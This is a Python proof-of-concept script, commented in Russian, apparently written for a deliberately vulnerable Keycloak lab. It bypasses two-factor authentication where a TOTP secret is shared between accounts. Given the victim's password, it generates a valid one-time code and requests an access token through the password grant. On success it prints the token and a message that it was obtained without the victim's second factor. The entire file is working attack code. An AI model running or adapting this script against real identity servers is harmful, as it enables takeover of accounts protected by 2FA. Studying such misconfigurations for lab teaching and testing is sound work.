#!/usr/bin/env python3
"""Вход по Resource Owner Password Grant с подстановкой TOTP.

Демонстрирует обход 2FA при ОБЩЕМ (shared) TOTP-секрете: атакующий знает
пароль жертвы и тот же самый секрет, что и у его собственной учётки, —
поэтому сгенерированный код проходит для жертвы.

Пример:
  python3 login_totp.py --username alice --password 'Passw0rd!' --secret JBSWY3DPEHPK3PXP
"""
import argparse
import json
import os
import sys
import urllib.parse
import urllib.request
import urllib.error

from totp import totp, seconds_left


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=os.environ.get("KC_URL", "http://keycloak.127.0.0.1.nip.io:8080"))
    p.add_argument("--realm", default="vulnerable")
    p.add_argument("--client-id", default="direct-grant")
    p.add_argument("--client-secret", default="direct-grant-secret")
    p.add_argument("--username", required=True, help="целевая (жертва) учётка")
    p.add_argument("--password", required=True, help="пароль жертвы (по сценарию известен)")
    p.add_argument("--secret", required=True, help="общий TOTP-секрет")
    a = p.parse_args()

    code = totp(a.secret)
    print(f"[*] TOTP-код из общего секрета: {code} (осталось {seconds_left()}s)")

    data = urllib.parse.urlencode({
        "grant_type": "password",
        "client_id": a.client_id,
        "client_secret": a.client_secret,
        "username": a.username,
        "password": a.password,
        "totp": code,
    }).encode()

    req = urllib.request.Request(
        f"{a.url}/realms/{a.realm}/protocol/openid-connect/token",
        data=data, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            tokens = json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"[!] Отказ ({e.code}) — OTP не принят или ROPC/OTP не настроен:\n{body}")
        sys.exit(1)

    print(f"[+] УСПЕХ: получен токен для {a.username!r} без второго фактора жертвы")
    print(f"    access_token: {tokens['access_token'][:60]}...")
    print(f"    expires_in:   {tokens.get('expires_in')}s")


if __name__ == "__main__":
    main()